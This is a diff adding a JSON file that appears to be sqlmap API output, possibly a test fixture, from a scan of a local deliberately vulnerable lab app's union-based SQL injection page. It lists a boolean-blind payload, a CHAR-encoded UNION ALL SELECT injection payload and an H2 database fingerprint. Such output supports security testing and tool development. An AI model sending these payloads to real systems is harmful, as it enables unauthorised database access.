@@ -1,0 +1,73 @@
+{
+    "success": true,
+    "data": [
+        {
+            "status": 1,
+            "type": 0,
+            "type_name": "TARGET",
+            "value": {
+                "url": "http://127.0.0.1:19090/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_1",
+                "query": "id=1",
+                "data": null
+            }
+        },
+        {
+            "status": 1,
+            "type": 1,
+            "type_name": "TECHNIQUES",
+            "value": [
+                {
+                    "place": "GET",
+                    "parameter": "id",
+                    "notes": [],
+                    "data": [
+                        {
+                            "technique": "boolean-based blind",
+                            "title": "AND boolean-based blind - WHERE or HAVING clause",
+                            "payload": "id=1 AND 3607=3607",
+                            "vector": "AND [INFERENCE]",
+                            "comment": "",
+                            "trueLength": null
+                        },
+                        {
+                            "technique": "UNION query",
+                            "title": "Generic UNION query (NULL) - 1 to 20 columns",
+                            "payload": "id=-3089 UNION ALL SELECT NULL,CHAR(113)||CHAR(118)||CHAR(120)||CHAR(120)||CHAR(113)||CHAR(100)||CHAR(74)||CHAR(111)||CHAR(121)||CHAR(71)||CHAR(85)||CHAR(72)||CHAR(101)||CHAR(107)||CHAR(82)||CHAR(75)||CHAR(71)||CHAR(88)||CHAR(104)||CHAR(107)||CHAR(116)||CHAR(102)||CHAR(68)||CHAR(69)||CHAR(70)||CHAR(113)||CHAR(75)||CHAR(77)||CHAR(84)||CHAR(112)||CHAR(88)||CHAR(84)||CHAR(120)||CHAR(82)||CHAR(87)||CHAR(89)||CHAR(111)||CHAR(111)||CHAR(86)||CHAR(66)||CHAR(100)||CHAR(90)||CHAR(99)||CHAR(74)||CHAR(120)||CHAR(113)||CHAR(120)||CHAR(112)||CHAR(106)||CHAR(113),NULL-- EyIH",
+                            "vector": [
+                                1,
+                                3,
+                                "[GENERIC_SQL_COMMENT]",
+                                "",
+                                "",
+                                "NULL",
+                                2,
+                                false,
+                                null,
+                                null,
+                                null
+                            ],
+                            "comment": "[GENERIC_SQL_COMMENT]",
+                            "trueLength": null
+                        }
+                    ],
+                    "dbms": null,
+                    "dbms_version": null,
+                    "os": null
+                }
+            ]
+        },
+        {
+            "status": 1,
+            "type": 2,
+            "type_name": "DBMS_FINGERPRINT",
+            "value": "back-end DBMS: H2"
+        }
+    ],
+    "error": [],
+    "meta": {
+        "api_version": 2,
+        "sqlmap_version": "sqlmap/1.10.10#stable",
+        "url": "http://127.0.0.1:19090/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_1",
+        "timestamp": "2026-10-28 17:26:23"
+    }
+}
